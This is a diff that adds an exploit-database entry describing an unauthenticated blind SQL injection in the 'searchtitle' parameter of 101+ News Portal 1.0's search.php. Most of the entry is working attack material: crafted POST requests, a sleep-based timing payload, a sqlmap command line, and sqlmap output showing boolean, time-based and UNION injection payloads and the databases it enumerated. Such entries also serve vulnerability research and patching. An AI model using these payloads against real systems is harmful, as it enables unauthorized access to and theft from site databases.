@@ -1,0 +1,93 @@
+id: 38276
+date: 03/20/2023
+title: 101+ News Portal 1.0 SQL Injection Vulnerability
+author: Abdulhakim Öner
+cves: 
+
+# Exploit Title: 101+ News Portal - SQLi
+# Exploit Author: Abdulhakim Öner
+# Vendor Homepage: https://www.sourcecodester.com
+# Software Link: https://www.sourcecodester.com/php/16067/best-online-news-portal-project-php-free-download.html
+# Software Download: https://www.sourcecodester.com/sites/default/files/download/mayuri_k/101news_0.zip
+# Version: 1.0
+# Tested on: Windows, Linux
+
+## Description 
+A Blind SQL injection vulnerability in the page (/101news/search.php) in 101+ News Portal allows remote unauthenticated attackers to execute remote arbitrary SQL commands through "searchtitle" parameter. 
+
+## Request PoC
+```
+POST /101news/search.php HTTP/1.1
+Host: 192.168.1.101
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.1.101/101news/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Cookie: PHPSESSID=o5fslt60dlojncb7jnft04lps9
+
+searchtitle=232943'
+
+```
+
+This request causes an error. Adding "'%2b(select*from(select(sleep(20)))a)%2b'" to the end of "searchtitle" parameter, the response to request was 200 status code with message of OK, but 20 seconds later, which indicates that our sleep 20 command works. 
+
+```
+POST /101news/search.php HTTP/1.1
+Host: 192.168.1.101
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Referer: http://192.168.1.101/101news/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 59
+Cookie: PHPSESSID=o5fslt60dlojncb7jnft04lps9
+
+searchtitle=232943'%2b(select*from(select(sleep(20)))a)%2b'
+
+```
+
+## Exploit with sqlmap
+Save the request from burp to file 
+```
+┌──(root㉿caesar)-[/home/kali/Workstation/multi]
+└─# sqlmap -r sqli.txt -p 'searchtitle' --batch --dbs --level=3 --risk=2                                           
+---snip---
+POST parameter 'searchtitle' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 114 HTTP(s) requests:
+---
+Parameter: searchtitle (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: searchtitle=232943' AND 3793=(SELECT (CASE WHEN (3793=3793) THEN 3793 ELSE (SELECT 6168 UNION SELECT 2808) END))-- KdPX
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: searchtitle=232943' AND (SELECT 1460 FROM (SELECT(SLEEP(5)))dqHc)-- zMGY
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 8 columns
+    Payload: searchtitle=232943' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7162787071,0x457444695056617478516b4b4f666e73744162466478444e5061624161514f78726c727777764c6b,0x716a6b6271)-- -
+---
+[18:01:02] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 8.2.0, Apache 2.4.54
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[18:01:02] [INFO] fetching database names
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] newsportal
+[*] performance_schema
+[*] phpmyadmin
+---snip---
+
+```
+
+#  0day.today [2023-03-27]  #
